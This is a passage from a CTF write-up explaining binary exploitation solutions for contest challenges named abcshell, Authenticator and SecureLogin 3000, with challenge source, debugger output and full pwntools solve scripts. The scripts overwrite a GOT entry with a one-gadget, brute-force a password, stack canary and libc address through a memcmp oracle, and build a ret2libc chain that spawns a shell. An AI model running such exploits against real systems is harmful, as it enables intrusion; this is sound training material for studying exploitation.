    set {char}$addr = 0
    set $addr = $addr + 1
end
</code></pre>
<hr>
<pre class="hljs"><code>$rsp  0x7fffffffa9b8|+0x0000|+000: 0x00007ffff7e3d4a0  -&gt;  0x44c600008000e581
      0x7fffffffa9c0|+0x0008|+001: 0x0000555555556019  -&gt;  0x203f74657366666f 'offset? \n&gt; '  &lt;-  $rdi
      0x7fffffffa9c8|+0x0010|+002: 0x0000000000000000
      0x7fffffffa9d0|+0x0018|+003: 0x0000000000000d68 ('h\r'?)
      0x7fffffffa9d8|+0x0020|+004: 0x0000000000000000
      0x7fffffffa9e0|+0x0028|+005: 0x0000000000000000
      0x7fffffffa9e8|+0x0030|+006: 0x0000000000000000
      0x7fffffffa9f0|+0x0038|+007: 0x0000000000000000
-------------------------------------------------------------------------------------------------- code: x86:64 (gdb-native) ----
=&gt; 0x0:	[!] Cannot access memory at address 0x0
-------------------------------------------------------------------------------------------------------------- memory access ----
[!] Cannot access memory at address 0x0
-------------------------------------------------------------------------------------------------- threads (shown:4 / all:1) ----
[*Thread Id:1, tid:78789] Name: &quot;chal_patched&quot;, stopped at 0x000000000000 &lt;NO_SYMBOL&gt;, reason: SIGSEGV
---------------------------------------------------------------------------------------------------------------------- trace ----
[*#0] 0x000000000000 &lt;NO_SYMBOL&gt;
[ #1] 0x7ffff7e3d4a0 &lt;NO_SYMBOL&gt;
[ #2] 0x7ffff7e3f8ed &lt;NO_SYMBOL&gt;
[ #3] 0x7ffff7e3365b &lt;printf+0xab&gt;
[ #4] 0x55555555520b &lt;main+0x82&gt;
[ #5] 0x7ffff7e0824a &lt;NO_SYMBOL&gt;
[ #6] 0x7ffff7e08305 &lt;__libc_start_main+0x85&gt;
[ #7] 0x5555555550c1 &lt;_start+0x21&gt;
---------------------------------------------------------------------------------------------------------------------------------
gef&gt; bt
#0  0x0000000000000000 in ?? ()
#1  0x00007ffff7e3d4a0 in ?? () from ./libc.so.6
#2  0x00007ffff7e3f8ed in ?? () from ./libc.so.6
#3  0x00007ffff7e3365b in printf () from ./libc.so.6
#4  0x000055555555520b in main ()
#5  0x00007ffff7e0824a in ?? () from ./libc.so.6
#6  0x00007ffff7e08305 in __libc_start_main () from ./libc.so.6
#7  0x00005555555550c1 in _start ()
</code></pre>
<hr>
<p>The lion does not work hard for pwn.</p>
<p>By setting the GOT region to zero and continuing execution, we can see where we segfault and hence follow the backtrace of function calls to find the PLT function that calls our GOT entry.</p>
<p>We can view the first few instructions before #1 with <code>x/40i 0x00007ffff7e3d4a0-0x40</code>:</p>
<pre class="hljs"><code>0x7ffff7e3d460:	add    BYTE PTR [rax],al
0x7ffff7e3d462:	cmp    QWORD PTR [rsp],0x0
0x7ffff7e3d467:	je     0x7ffff7e3f710
0x7ffff7e3d46d:	test   bpl,0x2
0x7ffff7e3d471:	jne    0x7ffff7e3e918
0x7ffff7e3d477:	movdqu xmm1,XMMWORD PTR [r12]
0x7ffff7e3d47d:	mov    rdi,QWORD PTR [rsp]
0x7ffff7e3d481:	mov    esi,0x25
0x7ffff7e3d486:	movups XMMWORD PTR [rsp+0xe8],xmm1
0x7ffff7e3d48e:	mov    rax,QWORD PTR [r12+0x10]
0x7ffff7e3d493:	mov    QWORD PTR [rsp+0xf8],rax
0x7ffff7e3d49b:	call   0x7ffff7e07150 &lt;*ABS*+0x9d660@plt&gt;
</code></pre>
<p>To then finally get the GOT entry that is called:</p>
<pre class="hljs"><code>gef&gt; disas 0x7ffff7e07150
Dump of assembler code for function *ABS*+0x9d660@plt:
   0x00007ffff7e07150 &lt;+0&gt;:	jmp    QWORD PTR [rip+0x1abf4a]        # 0x7ffff7fb30a0 &lt;*ABS*@got.plt&gt;
   0x00007ffff7e07156 &lt;+6&gt;:	push   0x24
   0x00007ffff7e0715b &lt;+11&gt;:	jmp    0x7ffff7e07000
End of assembler dump.
gef&gt;
</code></pre>
<p>The rest of the exploit then boils down to selecting the correct one gadget, finding the offset of the one gadget from the original GOT entry, finding the offset of the GOT entry from our mmap chunk, and then adding the one gadget offset to the GOT entry to trigger our shell:</p>
<pre class="hljs"><code>❯ python3 solve.py
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Starting local process '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched': pid 77574
[DEBUG] Received 0xf bytes:
    b'alloc size? \n'
    b'&gt; '
[DEBUG] Sent 0x8 bytes:
    b'1000000\n'
[DEBUG] Received 0xb bytes:
    b'offset? \n'
    b'&gt; '
[DEBUG] Sent 0x8 bytes:
    b'2924656\n'
[DEBUG] Received 0xe bytes:
    b'increment? \n'
    b'&gt; '
[DEBUG] Sent 0x8 bytes:
    b'-528289\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x51 bytes:
    b'chal\tchal_patched  ld-linux-x86-64.so.2  solve.py\n'
    b'chal.c\tDockerfile    libc.so.6\n'
chal	chal_patched  ld-linux-x86-64.so.2  solve.py
chal.c	Dockerfile    libc.so.6
$
</code></pre>
<p>Profit!!</p>
<h3 id="full-solve-script"tabindex="-1">Full solve script</h3>
<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

elf = ELF(<span class="hljs-string">&quot;./chal_patched&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
ld = ELF(<span class="hljs-string">&quot;./ld-linux-x86-64.so.2&quot;</span>)

context.binary = elf
context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>

p = process()
<span class="hljs-comment"># gdb.attach(p)</span>
<span class="hljs-comment"># p = remote(&#x27;chal2.sieberr.live&#x27;, 15007)</span>

<span class="hljs-comment"># As easy as a + b + c = shell!</span>
p.sendlineafter(<span class="hljs-string">b&#x27;size? \n&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1000000&#x27;</span>)
p.sendlineafter(<span class="hljs-string">b&#x27;offset? \n&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x2ca070</span>).encode())
p.sendlineafter(<span class="hljs-string">b&#x27;increment? \n&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">0x80fa1</span>).encode())

p.interactive()
</code></pre>
<h2 id="authenticator"tabindex="-1">Authenticator</h2>
<blockquote>
<p>authenticate to win!</p>
<p><strong>author</strong>: haowei</p>
<p><strong>solves</strong>: 3</p>
</blockquote>
<h3 id="challenge-protections-1"tabindex="-1">Challenge Protections</h3>
<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/authenticator/authenticator_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
    Debuginfo:  Yes
</code></pre>
<p>The challenge is an admin panel with the option to either “authenticate” with a password or “reset password”.</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> PWD_SIZE 0x10</span>

<span class="hljs-type">void</span> <span class="hljs-title function_">authenticate</span><span class="hljs-params">(<span class="hljs-type">char</span> *password)</span>{
    <span class="hljs-type">char</span> buffer[PWD_SIZE];
    
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter your current password: &quot;</span>);
    read(<span class="hljs-number">0</span>, buffer, <span class="hljs-keyword">sizeof</span>(buffer));

    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(buffer, password, PWD_SIZE)){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Intruder detected!\n&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
    }

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome, admin\n&gt;&gt; &quot;</span>);
    read(<span class="hljs-number">0</span>, buffer, <span class="hljs-number">0x100</span>);
}

<span class="hljs-type">void</span> <span class="hljs-title function_">reset_password</span><span class="hljs-params">(<span class="hljs-type">char</span> *password)</span>{
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x100</span>];

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter your current password: &quot;</span>);
    <span class="hljs-type">int</span> read_chars = read(<span class="hljs-number">0</span>, buffer, <span class="hljs-keyword">sizeof</span>(buffer));

    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(buffer, password, read_chars)){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Incorrect password!\n&quot;</span>);
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unfortunately, this feature isn&#x27;t implemented yet.\n&quot;</span>);
}

<span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1) Authenticate\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2) Reset password\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3) Exit\n&quot;</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What would you like to do?\n&quot;</span>);
}

<span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-type">char</span> *password)</span>{
    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);

    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, O_RDONLY);
    <span class="hljs-type">int</span> read_chars = read(fd, password, PWD_SIZE);

    <span class="hljs-keyword">if</span>(read_chars != PWD_SIZE){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Something went wrong! Open a ticket.\n&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
    }
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
    <span class="hljs-type">char</span> password[PWD_SIZE];
    <span class="hljs-type">int</span> input;

    init(password);

    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){
        menu();
        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;input);
        getchar();

        <span class="hljs-keyword">switch</span>(input){
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                authenticate(password);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                reset_password(password);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid input!\n&quot;</span>);
        }
    }
}
</code></pre>
<p>The program first reads 16 random chars from <code>/dev/null</code> to initialise as the password, which is a <code>char[PWD_SIZE</code> living in <code>main()</code>. The reset password function is unimplemented but verifies the password by comparing against the password in <code>main()</code> with <code>memcmp(buffer, password, read_chars)</code>. This will come in handy later.</p>
<p>When the user is authenticated in <code>authenticate(char *password)</code>, the program allows a <strong>buffer overflow</strong> of 0x100 - 0x10. This is mostly likely our end goal.</p>
<p>Note that for all functions, the <strong>password of reference</strong> lives only in <code>main()</code>.</p>
<h3 id="information-leak"tabindex="-1">Information Leak</h3>
<p>The challenge comes with a few protections:</p>
<ul>
<li>PIE enabled: The binary base address is randomised with ASLR</li>
<li>Canary enabled: <code>[rbp-0x8]</code> is compared to the canary living in the Thread-Local Storage (TLS) in order to prevent trivial overflow.</li>
</ul>
<p>and some artificial ones:</p>
<ul>
<li>A password check, which is random between each run</li>
</ul>
<p>In order to bypass all three protections, we need an info-leak primitive.</p>
<h4 id="reset-password-function"tabindex="-1">Reset Password Function</h4>
<p>Let’s look at the <code>reset_password(char *password)</code> function a bit closer:</p>
<pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">reset_password</span><span class="hljs-params">(<span class="hljs-type">char</span> *password)</span>{
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x100</span>];

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please enter your current password: &quot;</span>);
    <span class="hljs-type">int</span> read_chars = read(<span class="hljs-number">0</span>, buffer, <span class="hljs-keyword">sizeof</span>(buffer));

    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(buffer, password, read_chars)){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Incorrect password!\n&quot;</span>);
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unfortunately, this feature isn&#x27;t implemented yet.\n&quot;</span>);
}
</code></pre>
<p>Notice that <code>memcmp</code> takes a third argument, <code>read_chars</code>. According to the manpage for <code>memcmp</code>,</p>
<pre class="hljs"><code>
memcmp(3)                                           Library Functions Manual                                           memcmp(3)

NAME
       memcmp - compare memory areas

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include &lt;string.h&gt;

       int memcmp(const void s1[.n], const void s2[.n], size_t n);

DESCRIPTION
       The memcmp() function compares the first n bytes (each interpreted as unsigned char) of the memory areas s1 and s2.
</code></pre>
<p>When the third argument is given as <code>size_t n</code>, <code>memcmp</code> compares only the first <code>n</code> bytes of <code>s1[.n]</code>. Since <code>read_chars</code> is derived from the <code>read</code> call as its return value, the number of bytes read, we effectively control <code>read_chars</code>.</p>
<p>This also means that if we enter only 1 character that is correct, <code>memcmp</code> lets us pass, and for 2, 3, 4, and so on.</p>
<p>We can thus leak the password by bruting it bytewise with the <code>reset_password</code> function.</p>
<pre class="hljs"><code>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(buffer, password, read_chars)){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Incorrect password!\n&quot;</span>);
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unfortunately, this feature isn&#x27;t implemented yet.\n&quot;</span>);
</code></pre>
<p>As two different strings are printed depending on whether your password bytes are correct or not, we can use these strings as an <strong>oracle</strong> to tell us whether our additional byte was correct.</p>
<pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">pw</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;do?\n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)
    p.sendafter(<span class="hljs-string">b&#x27;password: &#x27;</span>, pw)

    resp = p.recvline().strip()

    <span class="hljs-comment"># &quot;Unfortunately&quot; means the byte is part of the correct password</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Unfortunately&#x27;</span> <span class="hljs-keyword">in</span> resp

<span class="hljs-keyword">def</span> <span class="hljs-title function_">authenticate</span>(<span class="hljs-params">pw, payload</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;do?\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
    p.sendafter(<span class="hljs-string">b&#x27;password: &#x27;</span>, pw)
    p.sendafter(<span class="hljs-string">b&#x27;\n&gt;&gt; &#x27;</span>, payload)


password = <span class="hljs-string">b&#x27;&#x27;</span>

<span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(password) &lt; <span class="hljs-number">0x10</span>:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):
        guess = password + <span class="hljs-built_in">bytes</span>([i])
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Trying: <span class="hljs-subst">{guess}</span>&quot;</span>)
        <span class="hljs-keyword">if</span> reset(guess):
            password = guess
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found byte: <span class="hljs-subst">{<span class="hljs-built_in">bytes</span>([i])}</span>&quot;</span>)
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid byte found. Something went wrong.&quot;</span>)
        <span class="hljs-keyword">break</span>
</code></pre>
<p>But other than the password, what can we leak?</p>
<p>Since our buffer is 0x100 bytes long, we are actually able to leak up to 0x100 bytes of the <code>main</code> stack frame starting from <code>char *password</code>!</p>
<p>Let’s take a look at the stack frame in <code>main</code>:</p>
<pre class="hljs"><code>gef&gt; tel $rsp-0x40
      0x7fffffffd100|+0x0050|+010: 0x23f6fba394689cbe  &lt;-  password
      0x7fffffffd108|+0x0058|+011: 0x0fe69b5301bebf2d
      0x7fffffffd110|+0x0060|+012: 0x0000000000000000
      0x7fffffffd118|+0x0068|+013: 0x5a6ac2709ac9bc00  &lt;-  canary
$rbp  0x7fffffffd120|+0x0070|+014: 0x00007fffffffd1c0  -&gt;  0x00007fffffffd220  -&gt;  0x0000000000000000
      0x7fffffffd128|+0x0078|+015: 0x00007ffff7c2a578 &lt;__libc_start_call_main+0x78&gt;  -&gt;  0xe80001ddb1e8c789 
</code></pre>
<p>Since the canary and the return address of <code>main</code>, which lives in libc, is within 0x100 bytes of the <code>password</code> buffer, we are actually able to leak those as well!</p>
<p>Increasing our leak length from 0x10 to 48:</p>
<pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">pw</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;do?\n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)
    q.sendafter(<span class="hljs-string">b&#x27;password: &#x27;</span>, pw)

    resp = p.recvline().strip()

    <span class="hljs-comment"># &quot;Unfortunately&quot; means the byte is part of the correct password</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Unfortunately&#x27;</span> <span class="hljs-keyword">in</span> resp

<span class="hljs-keyword">def</span> <span class="hljs-title function_">authenticate</span>(<span class="hljs-params">pw, payload</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;do?\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
    p.sendafter(<span class="hljs-string">b&#x27;password: &#x27;</span>, pw)
    p.sendafter(<span class="hljs-string">b&#x27;\n&gt;&gt; &#x27;</span>, payload)


password = <span class="hljs-string">b&#x27;&#x27;</span>

<span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(password) &lt; <span class="hljs-number">48</span>:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):
        guess = password + <span class="hljs-built_in">bytes</span>([i])
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Trying: <span class="hljs-subst">{guess}</span>&quot;</span>)
        <span class="hljs-keyword">if</span> reset(guess):
            password = guess
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found byte: <span class="hljs-subst">{<span class="hljs-built_in">bytes</span>([i])}</span>&quot;</span>)
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid byte found. Something went wrong.&quot;</span>)
        <span class="hljs-keyword">break</span>

context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>

canary = u64(password[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>])
log.info(<span class="hljs-string">&quot;canary, %#x&quot;</span>, canary)
libc.address = u64(password[<span class="hljs-number">40</span>:<span class="hljs-number">48</span>]) - libc.sym.__libc_start_call_main - <span class="hljs-number">0x78</span>
log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)
</code></pre>
<p>We can then perform a regular ret2libc to get a shell:</p>
<pre class="hljs"><code>canary = u64(password[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>])
log.info(<span class="hljs-string">&quot;canary, %#x&quot;</span>, canary)
libc.address = u64(password[<span class="hljs-number">40</span>:<span class="hljs-number">48</span>]) - libc.sym.__libc_start_call_main - <span class="hljs-number">0x78</span>
log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)

payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x18</span>
payload += pack(canary)
payload += <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span>
payload += pack(rop.find_gadget([<span class="hljs-string">&#x27;pop rdi&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])
payload += pack(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>)))
payload += pack(rop.ret[<span class="hljs-number">0</span>])
payload += pack(libc.sym.system)

authenticate(password[:<span class="hljs-number">16</span>], payload)

p.interactive()
</code></pre>
<h3 id="full-solve-script-1"tabindex="-1">Full solve script</h3>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

elf = context.binary = ELF(<span class="hljs-string">&quot;./authenticator_patched&quot;</span>)
libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
context.log_level = <span class="hljs-string">&#x27;error&#x27;</span>
context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>

<span class="hljs-comment"># p = process()</span>
<span class="hljs-comment"># gdb.attach(p)</span>
p = remote(<span class="hljs-string">&#x27;chal2.sieberr.live&#x27;</span>, <span class="hljs-number">15002</span>)

password = <span class="hljs-string">b&#x27;&#x27;</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">pw</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;do?\n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)
    p.sendafter(<span class="hljs-string">b&#x27;password: &#x27;</span>, pw)

    resp = p.recvline().strip()

    <span class="hljs-comment"># &quot;Unfortunately&quot; means the byte is part of the correct password</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Unfortunately&#x27;</span> <span class="hljs-keyword">in</span> resp

<span class="hljs-keyword">def</span> <span class="hljs-title function_">authenticate</span>(<span class="hljs-params">pw, payload</span>):
    p.sendlineafter(<span class="hljs-string">b&#x27;do?\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
    p.sendafter(<span class="hljs-string">b&#x27;password: &#x27;</span>, pw)
    p.sendafter(<span class="hljs-string">b&#x27;\n&gt;&gt; &#x27;</span>, payload)


password = <span class="hljs-string">b&#x27;&#x27;</span>

<span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(password) &lt; <span class="hljs-number">48</span>:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):
        guess = password + <span class="hljs-built_in">bytes</span>([i])
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Trying: <span class="hljs-subst">{guess}</span>&quot;</span>)
        <span class="hljs-keyword">if</span> reset(guess):
            password = guess
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found byte: <span class="hljs-subst">{<span class="hljs-built_in">bytes</span>([i])}</span>&quot;</span>)
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid byte found. Something went wrong.&quot;</span>)
        <span class="hljs-keyword">break</span>

context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>

canary = u64(password[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>])
log.info(<span class="hljs-string">&quot;canary, %#x&quot;</span>, canary)
libc.address = u64(password[<span class="hljs-number">40</span>:<span class="hljs-number">48</span>]) - libc.sym.__libc_start_call_main - <span class="hljs-number">0x78</span>
log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)

payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x18</span>
payload += pack(canary)
payload += <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">8</span>
payload += pack(rop.find_gadget([<span class="hljs-string">&#x27;pop rdi&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])
payload += pack(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>)))
payload += pack(rop.ret[<span class="hljs-number">0</span>])
payload += pack(libc.sym.system)

authenticate(password[:<span class="hljs-number">16</span>], payload)

p.interactive()
</code></pre>
<h2 id="securelogin-3000"tabindex="-1">SecureLogin 3000</h2>
<blockquote>
<p>Our company recently implemented the SecureLogin 3000 system, but someone had already broken in! Good thing we replaced the flag with a fake one beforehand!</p>
<p><strong>author</strong>: lty748</p>
<p><strong>solves</strong>: 4</p>
</blockquote>
<h3 id="challenge-protections-2"tabindex="-1">Challenge Protections</h3>
<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/securelogin/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
</code></pre>
<p>The challenge is yet another admin panel program allowing you to log in.</p>
<p>There is a target win function, <code>gurt(char *yo)</code>, that calls <code>system(yo)</code>.</p>
<pre class="hljs"><code><span class="hljs-comment">// gcc -o main main.c -no-pie</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-type">char</span> WELCOME_MSG[] = <span class="hljs-string">&quot;Welcome to SecureLogin 3000™&quot;</span>;
<span class="hljs-type">char</span> GOODBYE_MSG[] = <span class="hljs-string">&quot;Thank you for using SecureLogin 3000™&quot;</span>;

<span class="hljs-type">int</span> logged_in = <span class="hljs-number">0</span>;

<span class="hljs-type">void</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span>
{
    <span class="hljs-type">char</span> username[<span class="hljs-number">100</span>];
    FILE *<span class="hljs-built_in">log</span> = fopen(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>); <span class="hljs-comment">// real log</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter your username: &quot;</span>);
    fgets(username, <span class="hljs-keyword">sizeof</span>(username), <span class="hljs-built_in">stdin</span>);
    username[<span class="hljs-built_in">strcspn</span>(username, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;

    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(username, <span class="hljs-string">&quot;skibidiadmin123&quot;</span>) == <span class="hljs-number">0</span>)
    {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Access granted.&quot;</span>);
        logged_in = <span class="hljs-number">1</span>;
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Access denied, suspicious activity will be logged!&quot;</span>);
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">log</span>, username);
    }

    fclose(<span class="hljs-built_in">log</span>);
}

<span class="hljs-type">void</span> <span class="hljs-title function_">gurt</span><span class="hljs-params">(<span class="hljs-type">char</span> *yo)</span>
{
    system(yo);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
{
    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);

    <span class="hljs-built_in">puts</span>(WELCOME_MSG);

    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)
    {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1. Login\n2. Exit\n3. Admin Panel\n&gt; &quot;</span>);
        <span class="hljs-type">int</span> choice;
        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice);
        getchar();

        <span class="hljs-keyword">switch</span> (choice)
        {
        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
            login();
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
